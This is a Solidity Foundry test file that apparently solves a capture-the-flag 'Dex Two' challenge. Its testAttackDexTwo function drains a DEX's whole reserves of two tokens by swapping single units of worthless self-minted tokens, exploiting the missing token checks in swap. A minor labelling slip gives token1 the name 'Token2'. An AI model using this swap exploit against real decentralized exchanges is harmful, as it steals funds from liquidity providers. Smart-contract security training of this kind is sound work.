// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo, IERC20} from "../src/challenge-23-dex-two/DexTwo.sol";
import {MyErc20} from "../src/challenge-23-dex-two/MyErc20.sol";

contract DexTwoTest is Test {
    DexTwo public dex;
    IERC20 public token1;
    IERC20 public token2;
    MyErc20 public myToken1;
    MyErc20 public myToken2;
    address user = makeAddr("user");
    address owner = makeAddr("owner");

    function setUp() public {
        vm.startPrank(address(owner));
        dex = new DexTwo();

        token1 = new SwappableTokenTwo(address(dex), "Token1", "TK1", 110);
        token2 = new SwappableTokenTwo(address(dex), "Token2", "TK2", 110);

        dex.setTokens(address(token1), address(token2));

        token1.approve(address(dex), 100);
        dex.add_liquidity(address(token1), 100);

        token2.approve(address(dex), 100);
        dex.add_liquidity(address(token2), 100);

        token1.transfer(user, 10);
        token2.transfer(user, 10);
        vm.stopPrank();

        myToken1 = new MyErc20();
        myToken1.mint(user, 1);
        myToken1.mint(address(dex), 1);

        myToken2 = new MyErc20();
        myToken2.mint(user, 1);
        myToken2.mint(address(dex), 1);

        vm.label(user, "User");
        vm.label(owner, "Owner");
        vm.label(address(dex), "DEX");
        vm.label(address(token1), "Token1");
        vm.label(address(token1), "Token2");
        vm.label(address(myToken1), "MyToken1");
        vm.label(address(myToken2), "MyToken2");
    }

    function testInitialBalances() public {
        assertEq(token1.balanceOf(user), 10);
        assertEq(token2.balanceOf(user), 10);

        assertEq(token1.balanceOf(address(dex)), 100);
        assertEq(token2.balanceOf(address(dex)), 100);
    }

    function testAttackDexTwo() public {
        vm.startPrank(user);
        myToken1.approve(address(dex), 1);
        dex.swap(address(myToken1), address(token1), 1);

        myToken2.approve(address(dex), 1);
        dex.swap(address(myToken2), address(token2), 1);

        assertEq(token1.balanceOf(user), 110);
        assertEq(token2.balanceOf(user), 110);

        assertEq(token1.balanceOf(address(dex)), 0);
        assertEq(token2.balanceOf(address(dex)), 0);
        vm.stopPrank();
    }
}
